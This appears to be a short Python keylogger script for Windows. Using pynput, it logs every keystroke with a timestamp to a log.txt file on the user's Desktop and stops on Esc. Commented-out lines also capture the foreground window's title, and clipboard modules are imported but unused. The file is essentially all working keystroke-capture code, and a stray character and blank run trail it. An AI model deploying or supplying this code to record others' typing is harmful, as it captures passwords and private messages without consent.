from colorama.win32 import windll
from pynput.keyboard import Key, Listener
import logging
import win32clipboard
import win32gui

# def on_press(key):
#     print(f"{key} click")
#
# def on_release(key):
#     if key == Key.esc:
#         return False
#
#
# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()

# user32 = windll.user32
# hwnd = user32.GetForegroundWindow()
# app = win32gui.GetWindowText(hwnd)
# print(app)

from pynput.keyboard import Listener, Key

import os
import logging

username = os.getlogin()

directory = f"C:/Users/{username}/Desktop"

logging.basicConfig(filename=f"{directory}/log.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")


def on_press(key):
    logging.info(key)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
